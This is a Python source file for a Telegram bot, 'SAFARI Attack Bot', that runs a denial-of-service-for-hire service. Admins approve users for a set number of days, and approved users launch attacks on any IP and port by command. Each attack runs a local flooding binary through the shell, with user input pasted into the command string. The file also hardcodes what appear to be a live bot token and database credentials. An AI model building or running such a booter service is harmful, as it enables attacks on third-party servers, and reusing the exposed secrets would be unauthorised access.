#!/usr/bin/env python3
import asyncio
import logging
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import subprocess
import threading
import time
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    filters,
    ContextTypes
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from bson import ObjectId
import re
from functools import wraps
import html
import uuid
import os
import socket
import requests
import uvloop; uvloop.install()

# --- CONFIGURATION ---
BOT_TOKEN = "8735434023:AAFyHYvRVuK_XajrwAQdMjR5XyZ3C8-BWDU"
ADMIN_IDS = [6241594867]
MONGODB_URI = "mongodb+srv://aizensosukei671_db_user:ZNcc8ats5e3dCkjH@fire.ldyx5mo.mongodb.net/?appName=FIRE"
DATABASE_NAME = "attack_bot"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MAX_DURATION = 300  
MAX_CONCURRENT = 3

# --- ATTACK MANAGER (MODIFIED FOR REAL ATTACK) ---
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.lock = threading.Lock()
    
    def launch_attack(self, attack_id: str, ip: str, port: int, duration: int) -> Dict:
        with self.lock:
            if len(self.active_attacks) >= MAX_CONCURRENT:
                return {"success": False, "error": "Max concurrent attacks reached"}
            
            self.active_attacks[attack_id] = {
                "ip": ip, "port": port, "duration": duration,
                "start_time": time.time(),
                "end_time": time.time() + duration
            }
        
        # Real binary execution thread
        attack_thread = threading.Thread(target=self._run_binary, args=(attack_id, ip, port, duration))
        attack_thread.daemon = True
        attack_thread.start()
        
        return {"success": True, "id": attack_id}

    def _run_binary(self, attack_id: str, ip: str, port: int, duration: int):
        try:
            # Permission dena taaki file run ho sake
            os.system("chmod +x *")
            
            # Binary command (Yahan agar file ka naam 'bgmi' nahi hai toh use badal dena)
            # Command format: ./binary <ip> <port> <time> <threads>
            command = f"./bgmi {ip} {port} {duration} 10" 
            
            subprocess.run(command, shell=True)
        except Exception as e:
            logger.error(f"Attack execution failed: {e}")
        finally:
            with self.lock:
                if attack_id in self.active_attacks:
                    del self.active_attacks[attack_id]

attack_manager = AttackManager()

# --- DATABASE CLASS ---
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        self.users.create_index([("user_id", ASCENDING)], unique=True)

    def get_user(self, user_id: int):
        return self.users.find_one({"user_id": user_id})

    def create_user(self, user_id: int, username: str = None):
        if not self.get_user(user_id):
            self.users.insert_one({
                "user_id": user_id, "username": username, "approved": False,
                "total_attacks": 0, "created_at": datetime.now(timezone.utc)
            })

    def approve_user(self, user_id: int, days: int):
        expiry = datetime.now(timezone.utc) + timedelta(days=days)
        self.users.update_one({"user_id": user_id}, {"$set": {"approved": True, "expires_at": expiry}})
        return True

    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str):
        self.attacks.insert_one({
            "user_id": user_id, "ip": ip, "port": port, "duration": duration,
            "status": status, "timestamp": datetime.now(timezone.utc)
        })
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})

db = Database()

# --- BOT HANDLERS ---
async def start(update, context):
    db.create_user(update.effective_user.id, update.effective_user.username)
    await update.message.reply_text("🚀 **SAFARI Attack Bot Live!**\nUse /help for commands.")

async def attack(update, context):
    user = db.get_user(update.effective_user.id)
    if not user or not user.get("approved"):
        return await update.message.reply_text("❌ Not approved!")

    if len(context.args) != 3:
        return await update.message.reply_text("Usage: /attack <ip> <port> <time>")

    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])
    
    if port in BLOCKED_PORTS: return await update.message.reply_text("❌ Port Blocked!")
    if duration > MAX_DURATION: return await update.message.reply_text(f"❌ Max {MAX_DURATION}s!")

    res = attack_manager.launch_attack(str(uuid.uuid4())[:8], ip, port, duration)
    if res["success"]:
        db.log_attack(update.effective_user.id, ip, port, duration, "success")
        await update.message.reply_text(f"🚀 **Attack Launched!**\nTarget: {ip}:{port}\nTime: {duration}s")
    else:
        await update.message.reply_text(f"❌ {res['error']}")

@wraps(attack)
async def approve(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    try:
        uid, days = int(context.args[0]), int(context.args[1])
        db.approve_user(uid, days)
        await update.message.reply_text(f"✅ Approved {uid}")
    except: await update.message.reply_text("/approve <id> <days>")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("approve", approve))
    print("Bot Started...")
    app.run_polling()

if __name__ == "__main__":
    main()
